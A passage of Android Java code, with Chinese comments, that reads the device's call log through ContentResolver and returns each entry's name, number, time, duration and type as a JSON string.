                    , CallLog.Calls.TYPE};// 通话类型}
            String mobile;//被授权人电话号码

            // 1.获得ContentResolver
            resolver = context.getContentResolver();
//判断api版本，android6.0以上的需要动态申请权限

            // 2.利用ContentResolver的query方法查询通话记录数据库
            /**
             * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
             * @param projection 需要查询的字段
             * @param selection sql语句where之后的语句
             * @param selectionArgs ?占位符代表的数据
             * @param sortOrder 排序方式
             */
            Cursor cursor = resolver.query(callUri, // 查询通话记录的URI
                    columns
                    , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
            );
            // 3.通过Cursor获得数据
            JSONArray list = new JSONArray();
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
                String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
                int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                if (type != 1) {
                    type = 0;
                }
                JSONObject map = new JSONObject();
                //"未备注联系人"
                map.put("fullname", (name == null) ? "" : name);//姓名
                map.put("phone", number);//手机号
                map.put("callTime", dateLong);//通话日期
                map.put("callDuration", duration);//时长
                map.put("callType", type);//类型
                list.put(map);
            }
            cursor.close();
            if (list.length() == 0) {
                return "";
            }
            return list.toString();
        } catch (Exception e) {
            return "";

        }

    }
}
